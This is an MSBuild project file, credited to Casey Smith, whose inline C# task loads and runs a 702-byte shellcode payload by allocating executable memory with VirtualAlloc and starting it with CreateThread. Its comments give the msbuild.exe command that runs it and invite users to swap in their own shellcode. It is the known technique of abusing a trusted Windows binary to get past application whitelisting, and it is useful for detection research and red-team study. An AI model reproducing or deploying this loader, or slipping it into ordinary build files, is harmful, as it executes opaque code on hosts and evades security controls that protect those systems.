<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
			//replace with your own shellcode
		    byte[] shellcode = new byte[702] { 0xbd,0x81,0xad,0xf7,0x8b,0xdb,0xdb,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0xa9,0x83,0xe8,0xfc,0x31,0x68,0x11,0x03,0x68,0x11,0xe2,0x74,0x77,0x31,0x52,0x02,0xac,0x4a,0xdd,0x83,0x74,0xc5,0x62,0x09,0xac,0xe3,0x2a,0x0e,0x9f,0xb1,0x5b,0x53,0xa2,0x22,0xe7,0xf8,0xfe,0xd8,0x6e,0x0c,0xee,0x01,0xb1,0x5f,0x6c,0x45,0xcd,0x44,0x24,0x11,0x90,0x6a,0x9a,0xb0,0x15,0xed,0x28,0xf9,0xec,0xb3,0xe2,0x94,0x26,0xd8,0xf1,0x37,0xca,0x3a,0xf4,0x05,0x38,0x86,0x2b,0x12,0x95,0x4a,0x02,0x03,0xee,0x23,0xf7,0x2a,0x3d,0x3d,0x09,0x4a,0x76,0x56,0x78,0x76,0xe1,0xaa,0x14,0x27,0xf6,0x97,0xf5,0x89,0x21,0x8f,0x24,0xbb,0xe1,0x48,0xee,0x87,0xc6,0x5d,0xe9,0xe4,0x5f,0xd0,0x48,0xa9,0x87,0x10,0xa6,0xc9,0x4b,0x83,0x93,0x41,0x0c,0x29,0xf4,0x5e,0x34,0x25,0x2c,0xc2,0x18,0x86,0x60,0x8b,0xeb,0x37,0x6a,0xa4,0x1e,0xcc,0xa8,0xea,0xf7,0x4e,0xcd,0xc3,0x18,0x05,0x03,0x9e,0xe5,0x9f,0x39,0xf1,0xc4,0xbd,0xcc,0xa8,0xfe,0x93,0x3c,0x09,0xef,0xa7,0x1f,0x45,0x1c,0x05,0xa7,0xb6,0xbc,0x9e,0x91,0xca,0x12,0x10,0xc4,0x13,0xc6,0xc1,0xd1,0x02,0x70,0xb1,0xf8,0xcc,0xf8,0xdc,0x34,0xef,0xf1,0xae,0xf2,0x63,0x29,0xd1,0xe3,0x82,0xdb,0xa7,0xf3,0x4a,0x20,0x25,0x1c,0x88,0xbd,0xee,0xbe,0x4c,0x9a,0xb9,0x4e,0xfa,0x01,0x58,0xe8,0xe4,0x59,0x12,0xd1,0x8b,0xc4,0xe3,0x33,0x72,0x68,0x04,0x60,0x99,0xa5,0x0a,0x21,0x55,0xf1,0x9f,0x52,0x37,0xaf,0xc3,0xf1,0x63,0x1d,0xb9,0x47,0x54,0xc5,0xe7,0xaf,0xe2,0x16,0xce,0xf3,0x30,0xe8,0x98,0xf0,0x99,0x15,0xee,0x08,0x98,0x04,0xb7,0x0a,0xfe,0x91,0xb8,0xba,0x02,0xe2,0x65,0x7f,0x12,0x93,0xf3,0x75,0xf8,0xdf,0xf5,0x35,0x2b,0x22,0x62,0xb3,0xf3,0x03,0x49,0x7d,0x1b,0x47,0x5d,0x8a,0x20,0xa3,0x5a,0x58,0x62,0xf5,0x05,0x1f,0x0c,0xd0,0xfc,0x51,0x00,0xbf,0xdd,0x28,0x72,0x99,0x82,0x25,0xf0,0x9c,0x46,0x40,0xa8,0xa3,0x32,0xd5,0x9d,0xa3,0x20,0x3a,0x56,0x86,0xcb,0xa2,0xfc,0x6a,0x16,0x91,0x0f,0xad,0x35,0x7e,0xae,0x53,0x75,0x9d,0x20,0x8a,0xa9,0xe2,0x64,0xb3,0xa9,0x2b,0xef,0x7c,0xc9,0xc0,0x7d,0xd2,0xe1,0x69,0xe0,0xeb,0xd4,0x6b,0x28,0xfb,0xa0,0x1b,0xc5,0x1d,0xb2,0xb9,0x1b,0x4c,0xb6,0x43,0x44,0xa0,0x1b,0xf2,0x20,0xf9,0xc5,0x41,0x26,0x32,0xf9,0x9c,0xfc,0xae,0xeb,0xa3,0x98,0xe7,0xe8,0xda,0x7e,0xc8,0x46,0x63,0xf0,0x1e,0x1c,0xdf,0x89,0xf7,0xb3,0xb0,0x57,0x56,0x83,0x3a,0xde,0x52,0x2a,0xfa,0x73,0xdd,0xde,0x34,0x87,0xd7,0xcc,0x0a,0xe9,0xd3,0x9a,0x72,0xfd,0x8a,0x1a,0xba,0x6a,0xb9,0x77,0x53,0x52,0x1e,0xee,0x41,0x0a,0xb3,0x65,0xae,0xc7,0x36,0xc9,0x06,0xc9,0xe1,0xf4,0x51,0xe8,0x83,0xca,0x66,0x96,0x11,0x92,0x74,0x49,0x87,0x76,0x0e,0x34,0x52,0x69,0x34,0xcd,0x00,0x32,0x58,0x8c,0x41,0x8b,0xfd,0xc1,0x9d,0x24,0x01,0xa9,0xdb,0x82,0x88,0xdc,0x56,0x71,0xaf,0x02,0xc3,0x23,0x50,0xae,0xa6,0x5a,0xab,0xe0,0xce,0xdf,0xc5,0x80,0xa1,0x29,0x1f,0xd4,0x08,0x5c,0xd9,0x45,0xf2,0x53,0xcf,0x09,0x7b,0xc4,0xf0,0x37,0x17,0xe4,0x08,0xd6,0x0d,0x12,0x87,0xb1,0x5c,0x88,0x52,0x69,0xfd,0x2f,0x35,0x21,0x8a,0x81,0xa8,0x47,0x58,0x99,0x80,0xcf,0x7f,0xaa,0xed,0xdd,0x39,0xea,0xf9,0x71,0xed,0x62,0x4e,0xf1,0xeb,0x54,0xf2,0x16,0x5d,0xa2,0x1d,0x63,0x45,0x76,0xb0,0xf6,0x67,0x26,0xad,0xd1,0x27,0x65,0x57,0x77,0x36,0xe3,0xc1,0xc0,0x74,0xd2,0xe4,0xfa,0xb1,0x25,0x13,0x15,0x08,0xd1,0x5d,0x57,0x02,0xc3,0xbf,0x7e,0xaa,0x6f,0x6f,0xa0,0xef,0xe1,0x1e,0xc9,0xc7,0xc0,0xf7,0x5c,0x44,0x72,0xf8,0x91,0x4f,0x3b,0x11,0x2c,0xcc,0xa4,0x6c,0xc1,0xa7,0x65,0x58,0x4b,0x57,0x48,0x6f,0xe2,0x03,0xf3,0x5c,0x5e,0xf6,0x6a,0x29,0x26,0xde,0x59,0x4d,0x08,0x4a,0x9f,0xca,0xf7,0x02,0x18,0xbd,0x22,0x93,0x6f,0xc2,0xe0,0x6d,0x42,0x48,0x26,0x84,0x9e,0x16,0xcc,0xb7,0x57,0xa5,0xb7,0xde,0x1c,0xda,0xd3,0xf4,0x6a,0xb6,0x7f,0x8b,0x31,0x78,0xd7,0x17,0x98,0x4c,0xcc,0x59,0x6a,0x48,0x5d,0x48,0xd8,0xbb,0xea,0x4e,0xdf,0x28,0x8c,0xb1 };
			UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>